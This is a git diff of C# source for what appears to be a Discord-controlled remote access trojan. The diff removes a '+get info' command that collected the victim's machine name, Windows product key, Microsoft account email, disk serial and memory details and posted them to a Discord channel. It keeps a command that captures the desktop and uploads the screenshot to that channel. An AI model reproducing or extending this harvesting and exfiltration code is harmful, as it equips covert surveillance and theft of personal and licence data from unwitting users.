@@ -6,19 +6,17 @@ using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 using Discord;
 using Discord.WebSocket;
 using System.Windows.Input;
 using System.Media;
-using Woof.SystemEx;
 
 #warning The Commands Are Really Difficult To Understand, I Don't Put Any Effort Into These Projects :3 NOT WITH ME COOKIE
 
 // login with token
 namespace meowuwu
 {
-    public partial class thingy : Form
+    public partial class thingy
     {
         public thingy()
         {
@@ -83,36 +81,7 @@ namespace meowuwu
             // grabs the pc info = Newtork, MashineName, WinProduct_key, Microsoft_acc, disk_serialNum, Memory_total, Memory_free, osVersion, ...
             if (message.Content == "+get info")
             {
-                var owo = SystemInformation.BootMode;
-                var hehe = SystemInformation.Network;
-                var productkey = SysInfo.WindowsProductKey;
-                var idk = SysInfo.GetMicrosoftAccount(Environment.UserName);
-                var kk = SysInfo.SystemDiskSerialNumber;
-                string emailname = Path.ChangeExtension(idk, null);
-                var totalram = SysInfo.SystemMemoryTotal;
-                var freeram = SysInfo.SystemMemoryFree;
-
-                var freeramnew = Convert.ToString(freeram);
-
-                string freeramnewnew = Path.ChangeExtension(freeramnew, null);
-
-                var totalramnew = Convert.ToString(totalram);
-
-                string totalramnewnew = Path.ChangeExtension(totalramnew, null);
-
-
-                EmbedBuilder uwu = new EmbedBuilder();
-                uwu.AddField("MachineName", Environment.MachineName, true);
-                uwu.AddField("OSVersion", Environment.OSVersion, true);
-                uwu.AddField("HWID", kk, true);
-                uwu.AddField("Product Key", productkey, true);
-                uwu.AddField("UserName", Environment.UserName, true);
-                uwu.AddField("BootMode", owo, true);
-                uwu.AddField("Network Presence", hehe, true);
-                uwu.AddField("Microsoft Account Email", idk, true);
-                uwu.AddField("Free RAM", freeramnewnew + " GB", true);
-                uwu.AddField("Total RAM", totalramnewnew + " GB", true);
-                message.Channel.SendMessageAsync(null, false, uwu.Build());
+                message.Channel.SendMessageAsync("hi");
             }
 
             
@@ -123,14 +92,10 @@ namespace meowuwu
                 {
                     Desktop();
                     Desktop1();
-                    var height = SystemInformation.VirtualScreen.Height;
-                    var width = SystemInformation.VirtualScreen.Width;
 
                     EmbedBuilder uwu = new EmbedBuilder();
                     uwu.WithTitle("Screen Resolution :)");
                     uwu.WithFooter("Screen Width and Screen Height are the added up depending on the monitor orientation");
-                    uwu.AddField("Screen Height (Both Screens)", height, true);
-                    uwu.AddField("Screen Width (Both Screens)", width, true);
 
                     message.Channel.SendMessageAsync(null, false, uwu.Build());
                     message.Channel.SendFileAsync("uwu.png");
